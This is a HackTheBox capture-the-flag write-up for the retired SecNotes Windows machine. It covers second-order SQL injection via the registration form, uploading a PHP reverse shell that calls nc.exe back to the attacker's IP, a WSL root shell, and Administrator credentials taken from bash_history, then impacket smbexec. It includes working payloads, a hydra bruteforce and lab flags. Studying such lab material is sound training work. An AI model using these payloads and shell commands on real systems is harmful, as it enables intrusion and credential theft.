# SecNotes: HackTheBox Writeup

| Field | Details |
| --- | --- |
| **Machine Name** | SecNotes |
| **OS** | Windows 10 (x64) |
| **Difficulty** | Medium |
| **Category** | Windows / Web / Second-Order SQLi / WSL Escape |
| **IP Address** | 10.129.6.201 |
| **User Flag** | `e4f6fb22fcccd821114d9e9b872d2747` |
| **Root Flag** | `5dc2fed2af44e6a64b963afc0fa45262` |
| **Exploit Method** | Second-Order SQL Injection (Registration Form) |
| **PrivEsc Method** | Windows Subsystem for Linux (WSL) → bash_history credential leak |
| **Status** | Retired ✅ |

---

## Attack Chain Summary

```
Nmap → Port 80 (IIS login/register) + Port 8808 (IIS) + Port 445 (SMB)
→ Hydra bruteforce on login failed
→ SQLi on login page failed (parameterised query)
→ Second-order SQLi on REGISTER form (' OR '1'='1)
→ Login with injected username → all users' notes returned
→ Tyler's credentials + SMB share path found in notes
→ smbclient tyler@new-site → upload nc.exe + rev.php
→ Trigger rev.php via port 8808 → reverse shell as tyler
→ wsl.exe found → Linux root shell via WSL
→ /root/.bash_history → Administrator:u6!4ZwgwOM#^OBf#Nwnh
→ smbclient + impacket-smbexec.py as Administrator → root flag
```

---

## Phase 1: Reconnaissance

### 1.1: Full Port Discovery

**Goal:** Identify all open TCP ports before service enumeration.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- --min-rate 5000 -T4 10.129.6.201 -oN scans/allports.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 11:14 IST
Nmap scan report for 10.129.6.201
Host is up (0.19s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 49.31 seconds
```

**Output Analysis:**

| Port | Initial Assessment |
| --- | --- |
| 80/tcp | Web application: primary entry point |
| 445/tcp | SMB: enumerate after credentials found |
| 8808/tcp | Second IIS instance: unusual; investigate relationship to port 80 |

Two IIS instances running simultaneously is immediately notable. In CTF and real-world environments this pattern often means one site serves the application and the other is a staging or internal site whose web root is accessible via another channel (e.g., a file share).

---

### 1.2: Service and Version Enumeration

**Goal:** Confirm service versions, OS build, and script output on all three ports.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sV -sC -p 80,445,8808 10.129.6.201 -oN scans/services.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 11:19 IST
Nmap scan report for 10.129.6.201
Host is up (0.19s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (DANGEROUS, but not default)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0

Host script results:
| smb-os-discovery:
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2025-04-22T06:49:43+00:00

Nmap done: 1 IP address (1 host up) scanned in 28.47 seconds
```

**Output Analysis:**

| Finding | Implication |
| --- | --- |
| IIS 10.0 on both 80 and 8808 | Both are IIS hosted: PHP running on one or both |
| Port 80 redirects to `login.php` | PHP running on IIS: not pure ASP.NET |
| Port 8808 shows default IIS page | Not publicly accessible via direct URLs yet, likely needs a specific path |
| Windows 10 Enterprise build 17134 | Modern OS: kernel exploits unlikely; focus on application logic |
| SMB signing disabled | Relay attacks viable in theory; credential-based access is the realistic path |
| Guest SMB auth attempted | Anonymous enumeration failed: need valid credentials |
| Workgroup: HTB | Standalone machine, no domain controller |

Add the hostname to `/etc/hosts`:

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.6.201 secnotes.htb" | sudo tee -a /etc/hosts
```

---

### 1.3: Web Application Enumeration (Port 80)

**Goal:** Map the application's attack surface: all input points, user-controllable parameters, and visible functionality.

Browsing to `http://secnotes.htb` shows a login page for "Secure Notes" with a `login.php` form and a "Sign up now" registration link. A "Contact us" link reveals a page mentioning **tyler**: confirming a valid username exists.

Visible attack surface:

| Endpoint | Method | Parameters | Notes |
| --- | --- | --- | --- |
| `/login.php` | POST | `username`, `password` | Standard credential form |
| `/register.php` | POST | `username`, `password`, `confirm_password` | Account self-registration enabled |
| `/contact.php` | POST | `message` | Sends to tyler: CSRF/SSRF surface |
| `/change_pass.php` | POST | `password`, `confirm_password` | Unauthenticated password change (CSRF) |
| `/home.php` | GET |: | Notes dashboard, post-login |

---

## Phase 2: Initial Access

### 2.1: Credential Bruteforce Attempt (Failed)

**Goal:** Test whether tyler's account password is guessable before attempting more complex attacks.

```bash
Hackerpatel007_1@htb[/htb]$ hydra -l tyler -P /usr/share/wordlists/rockyou.txt \
  secnotes.htb http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=incorrect" \
  -t 30 -V
```

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries
[DATA] attacking http-post-form://secnotes.htb/login.php:username=^USER^&password=^PASS^:F=incorrect
[80][http-post-form] host: secnotes.htb   login: tyler   password: [no result after 14344399 tries]
[STATUS] attack finished for secnotes.htb (0 complete)
```

**Result:** No valid password found. Tyler's password is not in `rockyou.txt`. Bruteforce is ruled out as a viable path.

---

### 2.2: SQL Injection on Login (Failed: Expected)

**Goal:** Test whether the login form is vulnerable to authentication bypass via SQLi.

Standard single-quote test in the username field:

```
Username: admin'
Password: anything
```

Response: Generic "Incorrect" error: no SQL error leakage, no auth bypass. The login form appears to use parameterised queries or prepared statements. This is intentional application hardening on the login page specifically.

Classic bypass payloads tested and failed:

- `' OR '1'='1'--`
- `' OR 1=1--`
- `admin'--`

---

### 2.3: Second-Order SQL Injection on Registration Form

**Goal:** Test whether the *registration* form sanitises username input before storing it, and whether that stored value is later interpolated unsafely into a query.

This is a **second-order (stored) SQL injection**: the malicious payload is not executed at the point of insertion, but when the stored value is later retrieved and used in an unsafe query. The login form may be parameterised, but the backend query that retrieves notes for the logged-in user may build the `WHERE` clause by directly interpolating `$_SESSION['username']`: which was never sanitised on registration.

**Hypothesis:** If the backend notes query is something like:

```sql
SELECT * FROM notes WHERE username = '$username'
```

…and `$username` is pulled directly from the session after registration, then registering with a username of `' OR '1'='1'--` causes the executed query to become:

```sql
SELECT * FROM notes WHERE username = '' OR '1'='1'--'
```

This returns every note from every user in the database.

Register a new account at `/register.php`:

| Field | Value |
| --- | --- |
| Username | `' OR '1'='1'--` |
| Password | `anything123` |
| Confirm Password | `anything123` |

Registration accepted with no error. Now log in using exactly the same injected username:

| Field | Value |
| --- | --- |
| Username | `' OR '1'='1'--` |
| Password | `anything123` |

```
POST /login.php HTTP/1.1
Host: secnotes.htb
Content-Type: application/x-www-form-urlencoded

username=%27+OR+%271%27%3D%271%27--&password=anything123
```

**Result: all notes returned on `/home.php`:**

```
Note 1 (tyler):
  Due to the sensitivity of the data that is stored on this site, please be
  sure to use a strong password.

Note 2 (tyler):
  \\secnotes.htb\new-site
  tyler / 92g!mA8BGjOirkL%OG*&

Note 3 (tyler):
  [personal reminder content: not relevant]
```

**Flag breakdown:**

| Data Found | Value |
| --- | --- |
| SMB share path | `\\secnotes.htb\new-site` |
| Username | `tyler` |
| Password | `92g!mA8BGjOirkL%OG*&` |

**Why this worked:**

The login form used prepared statements: SQLi was not possible there. The registration form accepted the injected string and stored it verbatim. When the authenticated session query ran `SELECT * FROM notes WHERE username = '$username'`, it interpolated the raw stored value, making `'1'='1'` always true and returning every row in the notes table. This is the classic second-order injection pattern: sanitise at login, miss it at storage, pay the price at retrieval.

---

### 2.4: SMB Enumeration with Tyler's Credentials

**Goal:** Confirm the discovered credentials work against SMB and identify available shares.

```bash
Hackerpatel007_1@htb[/htb]$ smbmap -H 10.129.6.201 -u tyler -p '92g!mA8BGjOirkL%OG*&'
```

```
[+] IP: 10.129.6.201:445    Name: secnotes.htb
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        new-site                                                READ, WRITE
```

**Output Analysis:**

| Share | Access | Implication |
| --- | --- | --- |
| `ADMIN$` | No access | Cannot use psexec-style attacks directly |
| `C$` | No access | Cannot browse filesystem freely via SMB |
| `IPC$` | Read | RPC enumeration possible |
| `new-site` | **Read + Write** | Full control: this is the web root for port 8808 |

The `new-site` share with read/write access is the critical finding. The IIS server on port 8808 is serving content directly from this share's directory. Uploading a PHP file here makes it accessible via `http://secnotes.htb:8808/<filename>`.

---

### 2.5: Connect to SMB Share

**Goal:** Access the `new-site` share, confirm its contents map to port 8808, and prepare for file upload.

```bash
Hackerpatel007_1@htb[/htb]$ smbclient //10.129.6.201/new-site -U 'tyler%92g!mA8BGjOirkL%OG*&'
```

```
Try "help" for a list of commands.
smb: \> ls
  .                                   D        0  Wed Apr 22 11:43:12 2025
  ..                                  D        0  Wed Apr 22 11:43:12 2025
  iisstart.htm                        A      696  Thu Jun 21 22:56:02 2018
  iisstart.png                        A    98757  Thu Jun 21 22:56:02 2018

        12978687 blocks of size 4096. 6847231 blocks available
smb: \>
```

**Confirmation:** `iisstart.htm` and `iisstart.png` are the exact files behind the default IIS splash page visible at `http://secnotes.htb:8808/`. The share is the web root. Anything uploaded here is immediately web-accessible.

---

### 2.6: Upload nc.exe and PHP Reverse Shell

**Goal:** Upload a 64-bit netcat binary and a PHP script that executes it with a reverse shell callback.

**Why nc.exe + PHP rather than a pure PHP shell:**
PHP's `system()` can run Windows commands directly. The rev.php script calls `nc.exe` to establish a proper TCP reverse shell: this gives a reliable interactive `cmd.exe` session rather than a one-shot output-only webshell.

Prepare `rev.php` locally:

```bash
Hackerpatel007_1@htb[/htb]$ cat rev.php
<?php system("nc.exe -e cmd.exe 10.10.16.36 5555"); ?>
```

Upload both files via smbclient:

```bash
Hackerpatel007_1@htb[/htb]$ smbclient //10.129.6.201/new-site -U 'tyler%92g!mA8BGjOirkL%OG*&'
```

```
smb: \> put /usr/share/windows-resources/binaries/nc.exe nc.exe
putting file /usr/share/windows-resources/binaries/nc.exe as \nc.exe
(324.0 kb/s) (average 324.0 kb/s)
smb: \> put rev.php rev.php
putting file rev.php as \rev.php (0.5 kb/s) (average 312.1 kb/s)
smb: \> ls
  .                                   D        0  Wed Apr 22 11:51:08 2025
  ..                                  D        0  Wed Apr 22 11:51:08 2025
  iisstart.htm                        A      696  Thu Jun 21 22:56:02 2018
  iisstart.png                        A    98757  Thu Jun 21 22:56:02 2018
  nc.exe                              A    59392  Wed Apr 22 11:51:03 2025
  rev.php                             A       51  Wed Apr 22 11:51:08 2025

        12978687 blocks of size 4096. 6847231 blocks available
smb: \>
```

**Output Analysis:**

| File | Size | Status |
| --- | --- | --- |
| `nc.exe` | 59392 bytes | Uploaded: 64-bit Windows netcat binary |
| `rev.php` | 51 bytes | Uploaded: PHP reverse shell one-liner |

Both files confirmed present in the share.

---

### 2.7: Trigger Reverse Shell

**Goal:** Start a listener and request `rev.php` via port 8808 to execute the reverse shell.

Terminal 1: Listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -nvlp 5555
```

```
listening on [any] 5555 ...
```

Terminal 2: Trigger:

```bash
Hackerpatel007_1@htb[/htb]$ curl http://secnotes.htb:8808/rev.php
```

Terminal 1: Shell received:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.6.201] 49805
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>whoami
whoami
secnotes\tyler
```

**Flag breakdown:**

| Item | Value |
| --- | --- |
| Shell context | `secnotes\tyler` |
| Working directory | `C:\inetpub\new-site`: confirms SMB share = web root |
| Exploit chain | SQLi → credential disclosure → SMB write → PHP exec → reverse shell |

---

### 2.8: User Flag

```
C:\inetpub\new-site>type C:\Users\tyler\Desktop\user.txt
type C:\Users\tyler\Desktop\user.txt
e4f6fb22fcccd821114d9e9b872d2747
```

---

## Phase 3: Post-Foothold Enumeration (as Tyler)

### 3.1: Basic Host Enumeration

**Goal:** Establish OS details, architecture, and Tyler's privilege level.

```
C:\inetpub\new-site>systeminfo
systeminfo
```

```
Host Name:                 SECNOTES
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.17134 N/A Build 17134
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          tyler
Total Physical Memory:     4,095 MB
System Type:               x64-based PC
Domain:                    WORKGROUP
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: KB4284848
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 IP address(es)
                                 [01]: 10.129.6.201
```

```
C:\inetpub\new-site>whoami /priv
whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

**Output Analysis:**

| Finding | Implication |
| --- | --- |
| x64 Windows 10 build 17134 | Modern OS: token abuse, service misconfig, or application-level privesc needed |
| Only 1 hotfix | Possibly vulnerable to certain kernel exploits but WSL path is simpler |
| Tyler has minimal privileges | No SeImpersonate: Potato attacks not directly applicable |
| WORKGROUP: no domain | Local account attacks only |

---

### 3.2: Filesystem and Binary Discovery

**Goal:** Identify non-standard binaries and directories that indicate unusual configurations.

```
C:\inetpub\new-site>dir C:\Windows\System32\bash.exe
dir C:\Windows\System32\bash.exe
```

```
 Volume in drive C has no label.
 Volume Serial Number is 9CDD-BADA

 Directory of C:\Windows\System32

08/28/2018  03:05 AM           115,712 bash.exe
               1 File(s)        115,712 bytes
```

```
C:\inetpub\new-site>dir C:\Windows\System32\wsl.exe
dir C:\Windows\System32\wsl.exe
```

```
 Directory of C:\Windows\System32

08/28/2018  03:05 AM           115,712 wsl.exe
               1 File(s)        115,712 bytes
```

**Finding:** Both `bash.exe` and `wsl.exe` are present in `System32`. Windows Subsystem for Linux (WSL) is installed on this machine. This is the privilege escalation path.

**Why WSL is a privesc vector here:**

WSL allows Windows users to run a Linux environment. When WSL is run by a Windows process that is running under a high-privilege account (or where the WSL instance was initially configured by an administrator), the Linux shell may run as `root` within the WSL container, and importantly, the Linux root's filesystem access maps back to the Windows filesystem. Any data accessible from the Linux root shell is data accessible from Windows as well. The `.bash_history` file in the Linux root's home directory can contain commands that were run in previous administrative sessions, including cleartext credentials.

---

## Phase 4: Privilege Escalation

### 4.1: Launch WSL and Stabilise Shell

**Goal:** Drop into the WSL Linux environment and confirm the execution context.

```
C:\inetpub\new-site>wsl.exe
wsl.exe
```

```
root@SECNOTES:~#
```

Immediate root shell in the WSL Linux environment. No password prompt: WSL is configured to run as root automatically. Now stabilise the shell with a proper PTY:

```bash
root@SECNOTES:~# python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
root@SECNOTES:~#
```

Confirm environment:

```bash
root@SECNOTES:~# whoami && id
whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@SECNOTES:~# uname -a
uname -a
Linux SECNOTES 4.4.0-17134-Microsoft #471-Microsoft Fri Dec 01 14:43:00 PST 2017 x86_64 x86_64 x86_64 GNU/Linux
```

**Output Analysis:**

| Finding | Implication |
| --- | --- |
| WSL Linux kernel 4.4.0 | Running under Hyper-V/WSL hypervisor: not bare-metal Linux |
| uid=0(root) | Root within WSL Linux: filesystem access maps to Windows with high privilege |
| `~` home directory | Check `.bash_history` for previous administrative commands |

---

### 4.2: Bash History Credential Discovery

**Goal:** Extract previously executed commands from the root shell's history file.

```bash
root@SECNOTES:~# cat .bash_history
cat .bash_history
```

```
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
umount filesystem/
net
net use
net use * //127.0.0.1/c$ /user:administrator u6!4ZwgwOM#^OBf#Nwnh
net use * //127.0.0.1/c$ /user:administrator u6!4ZwgwOM#^OBf#Nwnh
cd /mnt/c/
echo "this is a really cool MACHINE"
apt install ruby
ruby -e 'require "smb"'
cd ~
git clone https://github.com/kerberoast/smb-ruby.git
ls
cd smb-ruby/
cat README
gem install bundler
bundle install
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\127.0.0.1\c$
```

**Flag breakdown:**

| History Entry | Value |
| --- | --- |
| `net use * //127.0.0.1/c$ /user:administrator u6!4ZwgwOM#^OBf#Nwnh` | Administrator password extracted |
| `smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\127.0.0.1\c$` | Full smbclient command with credential |
| **Administrator Password** | `u6!4ZwgwOM#^OBf#Nwnh` |

**Why this credential was here:**

The `.bash_history` file records every command run in an interactive bash session. Whoever configured WSL on this machine ran `smbclient` and `net use` interactively, embedding the Administrator password in plaintext in the history. This is an extremely common real-world misconfiguration: administrators test SMB connectivity from a shell and the credential persists in history indefinitely. The Linux root context means this file was never considered part of the Windows attack surface.

---

### 4.3: Administrator Access via smbclient

**Goal:** Authenticate to the C$ share as Administrator and retrieve the root flag.

```bash
Hackerpatel007_1@htb[/htb]$ smbclient //10.129.6.201/c$ -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh'
```

```
Try "help" for a list of commands.
smb: \> ls
  .                                  DR        0  Sun Jun 24 11:22:14 2018
  ..                                 DR        0  Sun Jun 24 11:22:14 2018
  $Recycle.Bin                       DHS        0  Sun Jun 24 11:25:09 2018
  Boot                               DHS        0  Fri Apr 13 02:31:18 2018
  bootmgr                           AHSR   393216  Sat Sep 15 05:01:16 2018
  Documents and Settings            DHSrn        0  Fri Apr 13 02:36:47 2018
  inetpub                             D        0  Sun Jun 24 12:30:16 2018
  pagefile.sys                      AHS 1207959552  Wed Apr 22 02:50:07 2025
  PerfLogs                            D        0  Fri Apr 13 01:34:39 2018
  Program Files                      DR        0  Tue Aug 28 03:09:57 2018
  Program Files (x86)                DR        0  Tue Aug 28 02:52:02 2018
  ProgramData                        DH        0  Sun Jun 24 12:43:08 2018
  Recovery                          DHS        0  Fri Apr 13 02:31:32 2018
  System Volume Information         DHS        0  Fri Apr 13 02:38:09 2018
  Users                              DR        0  Sun Jun 24 11:22:14 2018
  Windows                            DR        0  Tue Aug 28 02:59:33 2018

        12978687 blocks of size 4096. 6831619 blocks available
smb: \> cd Users\Administrator\Desktop\
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Sun Jun 24 12:14:26 2018
  ..                                 DR        0  Sun Jun 24 12:14:26 2018
  desktop.ini                       AHS      282  Sun Jun 24 11:22:14 2018
  root.txt                           A       34  Sun Jun 24 12:14:26 2018

smb: \Users\Administrator\Desktop\> get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt
```

```bash
Hackerpatel007_1@htb[/htb]$ cat root.txt
5dc2fed2af44e6a64b963afc0fa45262
```

---

## Phase 5: Alternative Administrator Execution Methods

### 5.1: impacket-smbexec (Working)

**Goal:** Obtain an interactive Administrator shell using Impacket's smbexec rather than file browsing.

```bash
Hackerpatel007_1@htb[/htb]$ impacket-smbexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.6.201
```

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

Shell confirmed as `nt authority\system`.

**How smbexec works:**

`smbexec.py` does not upload a binary to the target. Instead it:

1. Creates a temporary Windows service via the Service Control Manager over SMB/RPC.
2. Sets the service binary path to a `cmd.exe /Q /c <command>` string.
3. Redirects output to a temporary file on a writable share.
4. Reads the output file back over SMB.
5. Deletes both the service and the temp file after each command.

Because no binary is dropped on disk (beyond the temporary output file), smbexec is stealthier than psexec in environments where AV monitors new executable creation.

---

### 5.2: impacket-psexec (Blocked: Analysis)

**Goal:** Understand why psexec failed when smbexec succeeded with identical credentials.

```bash
Hackerpatel007_1@htb[/htb]$ impacket-psexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.6.201
```

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.6.201.....
[*] Found writable share ADMIN$
[*] Uploading file nkWruLPa.exe
[-] [Errno 13] Permission denied: 'ADMIN$'
[-] Unable to connect to requested share (ADMIN$)
```

**Why psexec failed while smbexec succeeded:**

| Method | Mechanism | Requirement | Result |
| --- | --- | --- | --- |
| `psexec.py` | Uploads a service binary (`PSEXESVC`) to `ADMIN$` (maps to `C:\Windows`), then creates + starts a service pointing to it | Write access to `ADMIN$` share | **BLOCKED**: `ADMIN$` is read-only for this user despite admin credentials |
| `smbexec.py` | Creates a service whose binary path *is* the command string itself (no file upload) | Only SCM access over SMB/RPC | **SUCCESS**: no write to `ADMIN$` required |

The key difference is file system write access. `psexec` must drop a binary in `C:\Windows`: if `ADMIN$` is explicitly restricted or AppLocker/AV is blocking writes there, psexec fails at the upload stage. `smbexec` bypasses this entirely because the command executes directly through the SCM without a staged binary.

This is a meaningful real-world distinction: in hardened environments where `ADMIN$` writes are audited or blocked, smbexec is the reliable alternative. Understanding *why* one works and the other does not is more valuable than simply knowing "try both."

---

## Flag Summary

| Flag | Value | Location |
| --- | --- | --- |
| User | `e4f6fb22fcccd821114d9e9b872d2747` | `C:\Users\tyler\Desktop\user.txt` |
| Root | `5dc2fed2af44e6a64b963afc0fa45262` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Lessons Learned

**1. When the login form is hardened, the registration form may not be.**
Second-order SQL injection exploits the gap between input sanitisation policies. The developer secured the authentication query with prepared statements but forgot that the stored username would later be interpolated into a separate retrieval query. Always test every input point independently: registration, profile update, and search fields are frequently overlooked.

**2. The injection fires at retrieval, not at insertion.**
This is the defining characteristic of second-order SQLi and why it evades many WAFs and input validators. At registration time, the payload `' OR '1'='1'--` looks like a string: no query executes. The vulnerability only manifests when the stored value participates in a query later. Understanding this timing is essential for both finding and explaining the bug.

**3. A writable SMB share mapped to a web root is a direct code execution path.**
The `new-site` share with `READ, WRITE` permissions mapped to the IIS root of port 8808 collapsed the attack to: upload file → request URL → get shell. This pattern is more common than it should be in Windows environments where IIS sites are provisioned via network shares. Always cross-reference SMB shares against running web servers.

**4. `nc.exe` plus PHP `system()` is a reliable foothold delivery mechanism on IIS.**
IIS with PHP enabled will execute `system()` calls in the context of the IIS application pool identity. The PHP script invokes `nc.exe` (which was also uploaded via the same writable share): no PowerShell, no `certutil`, no second transfer mechanism needed. The share provides both delivery and execution.

**5. WSL running as root with bash_history intact is a critical misconfiguration.**
Windows Subsystem for Linux introduces a second operating system context on the same machine. Many security controls applied to the Windows layer (AV scanning, credential managers, locked-down registry) do not apply inside WSL. The `.bash_history` file in WSL root's home directory is a plaintext log of every command run in that session: including commands with embedded credentials. On any engagement where WSL is present, `.bash_history`, `.bashrc`, and `.bash_profile` should be read immediately.

**6. smbexec succeeds where psexec fails: know the mechanism behind each.**
psexec requires writing a binary to `ADMIN$`. smbexec constructs a temporary service whose binary path is the command itself. When ADMIN$ writes are blocked or restricted, psexec fails at the upload stage with a permissions error. smbexec bypasses this entirely. The practical rule: if psexec fails with `Permission denied` on share upload, try smbexec before assuming the credentials are invalid.

**7. Credential storage in notes applications is a real-world risk, not just a CTF gimmick.**
Tyler stored SMB credentials in a web-based notes application. This is a pattern seen regularly on real assessments: developers and administrators store credentials in convenience tools (notes apps, Slack messages, internal wikis, Confluence pages) without considering that a single authentication bypass in that tool exposes everything stored in it. The application not only leaked the credential: it leaked it to every authenticated user via the SQL injection.

---

## Full Attack Chain Reference

| # | Phase | Action | Result |
| --- | --- | --- | --- |
| 1 | Recon | `nmap -p-` full port scan | Ports 80, 445, 8808 discovered |
| 2 | Recon | `nmap -sV -sC` service scan | IIS 10.0 on both web ports; SMB Windows 10 Enterprise |
| 3 | Web Enum | Browsed port 80 | Login + Register + Contact pages mapped; tyler username confirmed |
| 4 | Auth Bypass Attempt | Hydra bruteforce on tyler | Failed: password not in rockyou.txt |
| 5 | Auth Bypass Attempt | SQLi on `/login.php` | Failed: parameterised query |
| 6 | SQLi | Register with username `' OR '1'='1'--` | Registration accepted |
| 7 | SQLi | Login with injected username | All users' notes returned |
| 8 | Credential Discovery | Notes dashboard | `tyler / 92g!mA8BGjOirkL%OG*&` + `\\secnotes.htb\new-site` |
| 9 | SMB Enum | `smbmap -H 10.129.6.201 -u tyler` | `new-site` share: READ/WRITE |
| 10 | File Upload | `smbclient` → `put nc.exe` + `put rev.php` | Both files live in IIS root of port 8808 |
| 11 | RCE | `nc -nvlp 5555` → `curl http://secnotes.htb:8808/rev.php` | Reverse shell as `secnotes\tyler` |
| 12 | Flag | `type C:\Users\tyler\Desktop\user.txt` | `e4f6fb22fcccd821114d9e9b872d2747` |
| 13 | PrivEsc Discovery | `dir C:\Windows\System32\wsl.exe` | WSL installed: confirmed |
| 14 | PrivEsc | `wsl.exe` → `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Linux root shell via WSL |
| 15 | Credential Discovery | `cat /root/.bash_history` | `Administrator:u6!4ZwgwOM#^OBf#Nwnh` |
| 16 | Admin Access | `smbclient //10.129.6.201/c$ -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh'` | Full C$ filesystem access |
| 17 | Flag | `get root.txt` | `5dc2fed2af44e6a64b963afc0fa45262` |
| 18 | Alt Shell | `impacket-smbexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.6.201` | `nt authority\system` shell |
| 19 | Alt Shell (blocked) | `impacket-psexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.6.201` | Failed: ADMIN$ write denied |

---

## Commands Reference

| Command | Phase | Purpose |
| --- | --- | --- |
| `nmap -p- --min-rate 5000 -T4 10.129.6.201` | Recon | Full TCP port discovery |
| `nmap -sV -sC -p 80,445,8808 10.129.6.201` | Recon | Service version + default script scan |
| `echo "10.129.6.201 secnotes.htb" \| sudo tee -a /etc/hosts` | Setup | Hostname resolution |
| `hydra -l tyler -P /usr/share/wordlists/rockyou.txt secnotes.htb http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -t 30` | Auth | Credential bruteforce (failed) |
| Register with username `' OR '1'='1'--` at `/register.php` | SQLi | Second-order injection payload |
| `smbmap -H 10.129.6.201 -u tyler -p '92g!mA8BGjOirkL%OG*&'` | SMB | Enumerate shares with tyler credentials |
| `smbclient //10.129.6.201/new-site -U 'tyler%92g!mA8BGjOirkL%OG*&'` | SMB | Connect to writable new-site share |
| `put nc.exe` / `put rev.php` (smbclient) | Upload | Stage reverse shell components |
| `nc -nvlp 5555` | Handler | Catch incoming reverse shell |
| `curl http://secnotes.htb:8808/rev.php` | RCE | Trigger PHP reverse shell |
| `wsl.exe` | PrivEsc | Drop into WSL Linux as root |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Shell | Stabilise PTY inside WSL |
| `cat /root/.bash_history` | PrivEsc | Extract Administrator credential from history |
| `smbclient //10.129.6.201/c$ -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh'` | Admin Access | Browse C$ as Administrator |
| `impacket-smbexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.6.201` | Admin Shell | Interactive SYSTEM shell via smbexec |
| `impacket-psexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.6.201` | Admin Shell (failed) | psexec blocked by ADMIN$ write restriction |

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Usage |
| --- | --- | --- |
| T1190 | Exploit Public-Facing Application | Second-order SQL injection on registration form |
| T1552.001 | Unsecured Credentials: Credentials in Files | Administrator password extracted from `/root/.bash_history` |
| T1078.003 | Valid Accounts: Local Accounts | Tyler's credentials used for SMB access; Administrator credentials for escalation |
| T1505.003 | Server Software Component: Web Shell | PHP reverse shell uploaded to IIS web root via SMB |
| T1021.002 | Remote Services: SMB/Windows Admin Shares | Tyler's write access to `new-site` share used for file staging; C$ accessed as Administrator |
| T1059.003 | Command and Scripting Interpreter: Windows Command Shell | `cmd.exe` session obtained via nc.exe reverse shell |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | WSL bash shell used for Linux-layer enumeration |
| T1564.006 | Hide Artifacts: Run Virtual Instance | WSL used as an alternate execution environment bypassing Windows security controls |
| T1569.002 | System Services: Service Execution | impacket-smbexec creates temporary Windows service for command execution |
